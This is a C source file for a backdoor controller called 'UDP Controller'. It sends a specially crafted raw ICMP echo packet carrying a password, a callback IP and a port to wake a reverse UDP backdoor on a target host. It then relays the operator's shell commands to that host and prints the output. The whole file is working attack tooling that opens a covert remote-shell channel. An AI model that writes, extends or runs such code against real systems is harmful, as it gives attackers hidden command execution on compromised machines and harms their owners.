/*
 * udp-client.c
 *
 *  Created on: 2017年3月2日
 *  Base On Multiple project from GIT
 *  Thanks a lot!
 *  ICMP code from https://github.com/DhavalKapil/icmptunnel
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <stdbool.h>
enum STATUS {
	CONNECTED, STANDBY
};
enum ACTIVE_INDEX {
	ACT_COMMAND, SELF_IP, TARGET_IP, PASSWD, REVERSE_IP, REVERSE_PORT
};
enum CONNECT_INDEX {
	CON_COMMAND, SERVER_IP, SERVER_PORT
};

struct icmp_packet {
	char src_addr[100];
	char dest_addr[100];
	int type;
	char *payload;
	int payload_size;
};

/* struct for thread parameter */
typedef struct {
	struct sockaddr_in addr;
	int udp_socket;
	int peer_port;
} NET_INFO;

/* ICMP Protocol Functions */
void set_reply_type(struct icmp_packet *packet);
int open_icmp_socket();
void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details);
uint16_t in_cksum(uint16_t *addr, int len);
void prepare_headers(struct iphdr *ip, struct icmphdr *icmp);
void set_echo_type(struct icmp_packet *packet);
void active_remote(char params[5][32]);
/* endof ICMP Protocol Functions */

int parse_internal_cmd(const char *buffer, char param[6][32]);
void receiveMSG(void *param);

int main(int argc, char **argv) {
	const char BANNER[] = "UDP Controller \n";
	char params[6][32];
	int flag = STANDBY;
	char cmd[128];
	pthread_t thread_id;
	int ret;
	NET_INFO nf;

	printf(BANNER);
	while (true) {
		bzero(cmd, sizeof(cmd));
		bzero(params, sizeof(params));

		if(fgets(cmd, 128, stdin) == NULL)
			continue;
		/* remove '\n' at the end */
		cmd[strlen(cmd) - 1] = 0;
		/* internal command list */
		ret = parse_internal_cmd(cmd, params);
		/* waiting for remote connection and active remote*/
		if (strcmp(params[0], "active") == 0) {
			if (ret != 6) {
				printf(	"usage: active self_IP target_IP passwd return_IP return_PORT\n");
				continue;
			}
			if (flag == CONNECTED) {
				printf("Connection is busy, close it first\n");
				continue;
			}
			nf.udp_socket = socket(AF_INET, SOCK_DGRAM, 0);
			nf.addr.sin_family = AF_INET;
			nf.addr.sin_port = htons(atoi(params[REVERSE_PORT]));
			nf.addr.sin_addr.s_addr = inet_addr(params[REVERSE_IP]);
			bind(nf.udp_socket, (struct sockaddr *) &(nf.addr),
					sizeof(nf.addr));
			/* waiting for reverse bd connect*/
			pthread_create(&thread_id, NULL, (void *) receiveMSG, (void*) &nf);
			flag = CONNECTED;
			/* active remote reverse bd */
			active_remote(params);
			continue;
		}
		/* help command */
		if (strcmp(params[0], "?") == 0) {
			printf("Internal Command List:\n----------------------------\n");
			printf("connect\n\t connect TO remote UDP BD\n");
			printf("active\n\t use special ICMP package active reverse UDP BD\n");
			printf("close\n\t close all kinds of connections\n");
			printf("byebye\n\t quit this program\n");
			continue;
		}
		/* connect to remote bd */
		if (strcmp(params[0], "connect") == 0) {
			if (ret != 3) {
				printf("usage: connect server_IP server_PORT\n");
				continue;
			}
			if (flag == CONNECTED) {
				printf("Connection is busy, close it first\n");
				continue;
			}

			nf.udp_socket = socket(AF_INET, SOCK_DGRAM, 0);
			nf.addr.sin_family = AF_INET;
			nf.addr.sin_port = htons(atoi(params[SERVER_PORT]));
			nf.addr.sin_addr.s_addr = inet_addr(params[SERVER_IP]);
			pthread_create(&thread_id, NULL, (void *) receiveMSG, (void *) &nf);
			flag = CONNECTED;
			continue;
		}
		/* close socket and cancel thread */
		if (strcmp(params[0], "close") == 0) {
			if (nf.udp_socket) {
				printf("Close socket :%d \n", nf.udp_socket);
				close(nf.udp_socket);
				nf.udp_socket = 0;
			}
			if (thread_id)
				pthread_cancel(thread_id); /* perhaps thread can not terminate successfully */
			flag = STANDBY;
			continue;
		}
		/* exit command */
		if (strcmp(params[0], "byebye") == 0) {
			if (nf.udp_socket)
				close(nf.udp_socket);
			if (thread_id)
				pthread_cancel(thread_id); /* perhaps thread can not terminate successfully */
			printf("See you next time :-)\n");
			break;
		}
		// process remote system shell command
		if (flag == STANDBY)
			continue;
		sendto(nf.udp_socket, cmd, strlen(cmd), 0,
				(struct sockaddr *) &(nf.addr), sizeof(nf.addr));
	}
	return EXIT_SUCCESS;
}

void receiveMSG(void *param) {
	const int BUFFER_SIZE = 1024;
	NET_INFO * nfp = (NET_INFO *) param;
	ssize_t n;
	socklen_t len = sizeof(nfp->addr);
	char recv_buff[BUFFER_SIZE];
	while (1) {

		bzero(recv_buff, sizeof(recv_buff));
		n = recvfrom(nfp->udp_socket, recv_buff, 512, 0,
				(struct sockaddr *) &(nfp->addr), &len);
		pthread_testcancel();
		if (n > 0) {
			recv_buff[n] = 0;
			printf("%s", recv_buff);
		}
	}
}

int parse_internal_cmd(const char *buffer, char param[5][32]) {
	const int MAX_COUNT = 6;
	char backup[512];
	strcpy(backup, buffer);
	char *token = strtok(backup, " ");
	int param_count = 0;
	while (token != NULL && param_count < MAX_COUNT) {
		strcpy(param[param_count], token);
		token = strtok(NULL, " ");
		++param_count;
	}
	return param_count;
}

void active_remote(char params[6][32]) {
	char *dest = params[TARGET_IP];
	char *reverse_ip = params[REVERSE_IP];
	char *reverse_port = params[REVERSE_PORT];
	char *key = params[PASSWD];
	char *self_ip = params[SELF_IP];
	struct icmp_packet packet;
	int sock_fd;
	char command[512];

	strncpy(packet.src_addr, self_ip, strlen(self_ip) + 1);
	strncpy(packet.dest_addr, dest, strlen(dest) + 1);
	set_echo_type(&packet);
	bzero(command, 511);
	sprintf(command, "%s %s %d ", key, reverse_ip, atoi(reverse_port));
	memset(&command[strlen(command)], 'Q', 192 - 8 - strlen(command) - 1);

	packet.payload = command;
	packet.payload_size = strlen(packet.payload);
	sock_fd = open_icmp_socket();
	send_icmp_packet(sock_fd, &packet);
	close(sock_fd);
}

void set_reply_type(struct icmp_packet *packet) {
	packet->type = ICMP_ECHOREPLY;
}

void set_echo_type(struct icmp_packet *packet) {
	packet->type = ICMP_ECHO;
}
/**
 * Function to open a socket for icmp
 */
int open_icmp_socket() {
	int sock_fd, on = 1;

	sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

	if (sock_fd == -1) {
		perror("Unable to open ICMP socket\n");
		exit(EXIT_FAILURE);
	}

	// Providing IP Headers
	if (setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, (const char *) &on,
			sizeof(on)) == -1) {
		perror("Unable to set IP_HDRINCL socket option\n");
		exit(EXIT_FAILURE);
	}

	return sock_fd;
}

void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details) {
	// Source and destination IPs
	struct in_addr src_addr;
	struct in_addr dest_addr;

	struct iphdr *ip;
	struct icmphdr *icmp;
	char *icmp_payload;

	int packet_size;
	char *packet;

	struct sockaddr_in servaddr;

	inet_pton(AF_INET, packet_details->src_addr, &src_addr);
	inet_pton(AF_INET, packet_details->dest_addr, &dest_addr);

	packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr)
			+ packet_details->payload_size;
	packet = calloc(packet_size, sizeof(uint8_t));
	if (packet == NULL) {
		perror("No memory available\n");
		close(sock_fd);
		exit(EXIT_FAILURE);
	}

	// Initializing header and payload pointers
	ip = (struct iphdr *) packet;
	icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
	icmp_payload = (char *) (packet + sizeof(struct iphdr)
			+ sizeof(struct icmphdr));

	prepare_headers(ip, icmp);

	ip->tot_len = htons(packet_size);
	ip->saddr = src_addr.s_addr;
	ip->daddr = dest_addr.s_addr;

	memcpy(icmp_payload, packet_details->payload, packet_details->payload_size);

	icmp->type = packet_details->type;
	icmp->checksum = 0;
	icmp->checksum = in_cksum((unsigned short *) icmp,
			sizeof(struct icmphdr) + packet_details->payload_size);

	memset(&servaddr, 0, sizeof(struct sockaddr_in));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = dest_addr.s_addr;

	// Sending the packet
	sendto(sock_fd, packet, packet_size, 0, (struct sockaddr *) &servaddr,
			sizeof(struct sockaddr_in));

	free(packet);
}

uint16_t in_cksum(uint16_t *addr, int len) {
	int nleft = len;
	uint32_t sum = 0;
	uint16_t *w = addr;
	uint16_t answer = 0;

	// Adding 16 bits sequentially in sum
	while (nleft > 1) {
		sum += *w;
		nleft -= 2;
		w++;
	}

	// If an odd byte is left
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}

/**
 * Function to fill up common headers for IP and ICMP
 */
void prepare_headers(struct iphdr *ip, struct icmphdr *icmp) {
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->id = rand();
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = IPPROTO_ICMP;

	icmp->code = 0;
	icmp->un.echo.sequence = rand();
	icmp->un.echo.id = rand();
	icmp->checksum = 0;
}
